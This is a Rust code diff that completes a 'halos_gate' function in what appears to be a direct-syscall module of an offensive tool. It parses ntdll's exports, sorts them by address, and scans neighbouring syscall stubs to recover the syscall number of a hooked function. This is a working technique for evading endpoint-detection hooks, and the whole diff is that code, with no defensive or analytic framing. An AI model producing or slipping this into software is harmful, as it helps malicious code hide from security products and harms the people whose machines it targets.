@@ -188,10 +188,52 @@ pub unsafe fn resolve(entry: &SyscallEntry, api_hash: u32) -> Result<(u16, usize
     Ok((ssn, syscall_addr))
 }
 
-unsafe fn halos_gate(_ntdll: *mut c_void, _func: *mut c_void) -> Result<u16, SyscallError> {
-    // Walk +/- 16 neighbours by RVA, look for clean stubs, infer SSN.
-    // Full implementation completed in Task 18 (whoami canary), where it's
-    // exercised against real ntdll.
+/// Reconstruct SSN from neighbours: rebuild a sorted list of (rva, name_hash)
+/// for ntdll exports, locate target, walk +/- up to 16 neighbours looking for
+/// a clean stub. SSN delta = neighbour_index - target_index.
+unsafe fn halos_gate(ntdll: *mut c_void, func: *mut c_void) -> Result<u16, SyscallError> {
+    let base = ntdll as *const u8;
+    let dos = base as *const ImageDosHeader;
+    let nt  = base.add((*dos).e_lfanew as usize) as *const ImageNtHeaders64;
+    let export_dir = &(*nt).optional_header.data_directory[0];
+    let exp = base.add(export_dir.virtual_address as usize) as *const ImageExportDirectory;
+    let funcs = base.add((*exp).address_of_functions as usize) as *const u32;
+    let count = (*exp).number_of_names as usize;
+
+    // Collect (rva, index) into a fixed-size array on stack (up to 4096 exports)
+    let mut entries: [(u32, usize); 4096] = [(0, 0); 4096];
+    let n = core::cmp::min(count, 4096);
+    for i in 0..n {
+        let rva = *funcs.add(i);
+        entries[i] = (rva, i);
+    }
+    // Sort by RVA (simple insertion sort — small N typical)
+    for i in 1..n {
+        let mut j = i;
+        while j > 0 && entries[j-1].0 > entries[j].0 {
+            entries.swap(j-1, j);
+            j -= 1;
+        }
+    }
+    let target_rva = (func as usize - base as usize) as u32;
+    let target_idx = entries[..n].iter().position(|e| e.0 == target_rva).ok_or(SyscallError::HookedAndNoNeighbour)?;
+    // Walk neighbours
+    for offset in 1..=16usize {
+        for &(direction, sign) in &[(1isize, 1i32), (-1isize, -1i32)] {
+            let probe = target_idx as isize + direction * offset as isize;
+            if probe < 0 || probe as usize >= n { continue; }
+            let probe_rva = entries[probe as usize].0;
+            let stub = base.add(probe_rva as usize);
+            let bytes = core::slice::from_raw_parts(stub, 8);
+            if bytes[0..3] == [0x4C, 0x8B, 0xD1] && bytes[3] == 0xB8 {
+                let neighbour_ssn = u16::from_le_bytes([bytes[4], bytes[5]]);
+                let reconstructed = (neighbour_ssn as i32) - (sign * offset as i32);
+                if reconstructed >= 0 && reconstructed <= u16::MAX as i32 {
+                    return Ok(reconstructed as u16);
+                }
+            }
+        }
+    }
     Err(SyscallError::HookedAndNoNeighbour)
 }
 
